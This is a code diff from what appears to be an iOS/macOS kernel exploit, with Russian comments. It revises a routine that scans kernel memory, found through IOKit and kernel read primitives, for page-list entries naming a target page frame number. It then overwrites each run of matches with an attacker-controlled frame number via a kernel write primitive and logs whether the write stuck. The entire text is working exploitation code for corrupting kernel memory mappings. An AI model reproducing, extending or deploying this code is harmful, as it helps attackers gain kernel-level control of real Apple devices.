@@ -6290,26 +6290,30 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
                     uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
-                    // 1.9.238: PAGE-LIST серия — dst теперь 32 страницы, page-list
-                    // root-MD = 32 последовательных pfn32. Ищем серию ≥4: q==pfn32,
-                    // pfn32+1, pfn32+2, … — случайной быть не может. Патчим ВСЕ.
-                    if (q == (uint64_t)pfn32) {
-                        uint32_t run = 1;
-                        for (uint32_t r = 1; r < 32 && o + (uint64_t)(r + 1) * 8 <= sizeof(pbuf2); r++) {
+                    // 1.9.239: PAGE-LIST в ОБЕИХ упаковках — SCAN B доказал: page-list
+                    // большой поверхности лежит как (4<<32)|pfn (hi32=4!), не голой.
+                    // Кластер-детектор: страница с ≥4 qword подряд вида lo32=pfn+i
+                    // при hi32 ∈ {0,4} — патчим ВСЮ серию с сохранением hi-формы.
+                    {
+                        uint32_t run = 0, hiForm = 0;
+                        uint64_t mask = q;
+                        for (uint32_t r = 0; r < 32 && o + (uint64_t)(r + 1) * 8 <= sizeof(pbuf2); r++) {
                             uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
-                            if (qn == (uint64_t)pfn32 + r) run++; else break;
+                            uint32_t lo = (uint32_t)qn, hi = (uint32_t)(qn >> 32);
+                            if (lo == pfn32 + r && (hi == 0 || hi == 4)) { run++; hiForm |= hi; }
+                            else break;
                         }
                         if (run >= 4) {
-                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn @ %#llx+%#x — патчим все на ctlPFN %#x",
-                                      run, (unsigned long long)kva, o, ctlPFN]);
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (hi=%u) @ %#llx+%#x — патчим все на ctlPFN %#x",
+                                      run, hiForm, (unsigned long long)kva, o, ctlPFN]);
                             for (uint32_t r = 0; r < run; r++) {
+                                uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
                                 usleep(1500);
-                                early_kwrite64(kva + o + (uint64_t)r * 8, (uint64_t)ctlPFN);
+                                early_kwrite64(kva + o + (uint64_t)r * 8, (qn & 0xffffffff00000000ULL) | ctlPFN);
                             }
                             uint64_t rb = early_kread64(kva + o);
-                            kpNote(r, [NSString stringWithFormat:@"      readback[0]: %#018llx — %@", (unsigned long long)rb, rb == (uint64_t)ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                            // записываем в hit-массив для retry/форж-вайринга (форма2 = голый pfn — retry пишет ctlPFN)
-                            hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = 2; nDep++;
+                            kpNote(r, [NSString stringWithFormat:@"      readback[0]: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                            hitAddr[nDep] = kva + o; hitOld[nDep] = mask; hitForm[nDep] = 2; nDep++;
                             continue;
                         }
                     }
